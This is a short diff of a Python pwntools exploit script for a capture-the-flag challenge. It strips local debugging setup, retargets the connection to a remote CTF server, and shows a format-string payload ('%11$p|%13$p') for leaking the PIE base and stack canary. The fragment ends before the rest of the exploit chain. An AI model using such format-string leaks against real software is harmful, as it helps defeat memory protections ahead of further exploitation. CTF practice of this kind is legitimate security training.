@@ -3,19 +3,10 @@
 from pwn import *
 from pwn import p64
 
-context.terminal = 	["tmux", "splitw", "-h"]
-
-path = "./app"
+path = "./chall/app"
 exe = ELF(path)
 
-gdbscript = """
-b * ready_reader + 72
-c
-"""
-
-# io = gdb.debug(path, gdbscript=gdbscript)
-# io = process(path)
-io = remote("localhost", 1337)
+io = remote("pwn.dctf.si", 13372)
 
 # leak PIE and canary
 payload = b"%11$p|%13$p"
